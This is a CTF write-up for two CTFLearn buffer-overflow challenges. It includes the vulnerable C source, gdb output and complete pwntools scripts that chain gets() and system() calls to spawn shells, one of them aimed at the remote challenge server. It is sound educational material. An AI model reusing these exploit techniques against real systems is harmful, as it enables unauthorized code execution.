---
title: CTFLearn Medium PWN Challenges 
category: writeup
tags: others
---

I will try to do the last medium one when I understand a bit more about Heap pwn.

# Shell Time
We have the following challenge description:

> (Continued from RIP my bof)
Can you also get a shell? The flag is at /flag2.txt.
Hint: you do not need libc for this challenge.
nc [thekidofarcrania.com](http://thekidofarcrania.com/) 4902

I spent a bunch of time on this challenge and was finally able to solve it by just using a write-what-where technique.

The challenge continues from the RIP my bof challenge for which we already have an exploit script.

Except this time around we need to exploit it to get a shell and grab the second flag. 

## Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Defined in a separate source file for simplicity.
void init_visualize(char* buff);
void visualize(char* buff);

void win() {
  system("/bin/cat /flag.txt");
}

void vuln() {
  char padding[16];
  char buff[32];

  memset(buff, 0, sizeof(buff)); // Zero-out the buffer.
  memset(padding, 0xFF, sizeof(padding)); // Mark the padding with 0xff.

  // Initializes the stack visualization. Don't worry about it!
  init_visualize(buff); 

  // Prints out the stack before modification
  visualize(buff);

  printf("Input some text: ");
  gets(buff); // This is a vulnerable call!

  // Prints out the stack after modification
  visualize(buff); 
}

int main() {
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  vuln();
}
```

- We have a `system` function.
- We definitely have an overflow.
- However, we do not have a `/bin/sh` string in the code that we can use to pass in `system`.

## Exploiting

We have a script from before where we just called the `win` function:

```python
from pwn import *

#p = process("./server")
p = remote("thekidofarcrania.com", 4902)
padding = b"\x41"*60

win = 0x08048586

p.recv()

p.sendline(padding + p32(win))

p.interactive()
```

One potential solution can be using `ret2libc` OR we can write `/bin/sh` to the `bss` segment (where all of the uninitialized variables go) and then pass it in to the system function and we should have a shell.

We can do this in 2 stages.

### Stage 1

In this stage we just need to overflow buffer and then write `/bin/sh` to the bss segment.

We can find the `_bss_start` using `readelf -s`.

```python
root:shelltime/ # readelf -s server | grep bss 
    72: 0804a080     0 NOTYPE  GLOBAL DEFAULT   25 __bss_start
```

![gdb](/assets/img/ctflearn/shell-time-readelf.png)

Now we have a address to write to and now we need the address for the `system` function, `vuln` function so we can return to it and cause another overflow and address for the `gets` function.

![gdb](/assets/img/ctflearn/shell-time-function-addr.png)

```bash
gef➤  p system
$2 = {<text variable, no debug info>} 0x8048420 <system@plt>
gef➤  p gets
$3 = {<text variable, no debug info>} 0x8048400 <gets@plt>
gef➤  p vuln
$4 = {<text variable, no debug info>} 0x80485b1 <vuln>
```

We can now overflow the buffer and call the gets function to write to the `_bss_start` address and then return to the vuln function.

```python
from pwn import *

# Function addresses
gets = p32(0x8048400)
vuln = p32(0x080485b1)
system = p32(0x08048420)

p = process("./server")
# Stage 1
padding = b"\x41" * 60
p.recv()
bss = p32(0x0804a080)
p.sendline(padding + gets + vuln + bss)
# send /bin/sh
p.sendline(b"/bin/sh")
p.interactive()
```

![stage1](/assets/img/ctflearn/shell-time-stage1.png)

Cool we get the `Input some text:` message on the screen.

We can quickly confirm that we have written the `/bin/sh` string to the bss segment by attaching the process to gdb and breaking at vuln.

```python
from pwn import *

# Function addresses
gets = p32(0x8048400)
vuln = p32(0x080485b1)
system = p32(0x08048420)

p = process("./server")
gdb.attach(p.pid,  "b vuln")
# Stage 1
padding = b"\x41" * 60
p.recv()
bss = p32(0x0804a080)
p.sendline(padding + gets + vuln + bss)
# send /bin/sh
p.sendline(b"/bin/sh")
p.interactive()
```

We can hit continue once and then on the second break we can inspect the bss address.

![gdb](/assets/img/ctflearn/shell-time-gdb.png)

We have our string there. So we have successfully completed stage 1.

### Stage 2

For stage 2 all we need to do is overflow the buffer again and this time call system with the address of bss segment as the argument.

```python
from pwn import *

# Function addresses
gets = p32(0x8048400)
vuln = p32(0x080485b1)
system = p32(0x08048420)

p = remote("thekidofarcrania.com", 4902)
# Stage 1
padding = b"\x41" * 60
p.recv()
bss = p32(0x0804a080)
p.sendline(padding + gets + vuln + bss)
# send /bin/sh
p.sendline(b"/bin/sh")

# Stage 2 -> call system
p.sendline(padding + system + p32(0xdeadc0de) + bss) # 0xdeadc0de is a return address which doesnt matter

p.interactive()
```

![Shell](/assets/img/ctflearn/shell-time-shell.png)

And we have a flag.

# Favourite Color
> What's your favorite color? Would you like to share with me? Run the command: ssh [color@104.131.79.111](mailto:color@104.131.79.111) -p 1001 (pw: guest) to tell me!

For this challenge we need to SSH into the machine and exploit a SUID `color` binary to spawn a shell which will allow us to read the flag.

## Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int vuln() {
    char buf[32];
    
    printf("Enter your favorite color: ");
    gets(buf);
    
    int good = 0;
    for (int i = 0; buf[i]; i++) {
        good &= buf[i] ^ buf[i];
    }
    
    return good;
}

int main(char argc, char** argv) {
    setresuid(getegid(), getegid(), getegid());
    setresgid(getegid(), getegid(), getegid());
    
    //disable buffering.
    setbuf(stdout, NULL);
    
    if (vuln()) {
        puts("Me too! That's my favorite color too!");
        puts("You get a shell! Flag is in flag.txt");
        system("/bin/sh");
    } else {
        puts("Boo... I hate that color! :(");
    }
}
```

The `system("/bin/sh")` immediately stood out to me and I was like ah just modify a value and get it to execute? but that won't work because the value returned by the vuln function needs to be truthy but that won't happen as the a variable is being xor'd with itself which results in a 0 and then AND'd with the value of good which is 0 to start with. 

However, We can just call the system function with the `/bin/sh` string as it already exists in the binary.

All we have to do now is get the right addresses.

```c
color@ubuntu-512mb-nyc3-01:~$ gdb -q color         
Reading symbols from color...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel    
(gdb) disas main
-- SNIP --
0x0804866f <+144>:   call   0x8048440 <puts@plt>
0x08048674 <+149>:   add    esp,0x10
0x08048677 <+152>:   sub    esp,0xc
0x0804867a <+155>:   push   0x8048799
0x0804867f <+160>:   call   0x8048450 <system@plt>
-- SNIP --
(gdb) x/s 0x8048799
0x8048799:      "/bin/sh"
```

We now have a address of system function and an address where we can find `/bin/sh`.

## Testing for overflow

We can send some characters to it and see where it breaks.

![registers](/assets/img/ctflearn/favourite-color-registers.png)

We start overflowing the EIP at 52 bytes.

Now just sending the 52 bytes and then calling the system function with the `/bin/sh` string's address as an argument should drop a shell.

## Exploit

```python
from pwn import *

p = process("/home/color/color")
binsh = p32(0x8048799)
system = p32(0x8048450)
payload = b"\x41"*52
p.recv()
p.sendline(payload + system + p32(0xdeadbeef) + binsh)
p.interactive()
```

![shell](/assets/img/ctflearn/favourite-color-shell.png)
